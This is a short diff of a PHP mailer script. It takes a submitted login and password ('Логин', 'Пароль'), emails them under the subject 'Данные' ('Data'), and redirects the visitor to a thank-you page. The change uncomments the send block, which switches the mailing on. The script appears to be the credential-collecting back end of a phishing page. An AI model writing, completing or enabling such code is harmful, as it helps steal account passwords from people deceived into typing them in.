@@ -31,9 +31,9 @@ $mail->Subject = 'Данные';
 $mail->Body    = '<br>Логин: ' .$name . '<br>Пароль: ' .$pass;
 $mail->AltBody = '';
 
-/*if(!$mail->send()) {
+if(!$mail->send()) {
     echo 'Error';
 } else {
     header('location: thank-you.html');
-}*/
+}
 ?>
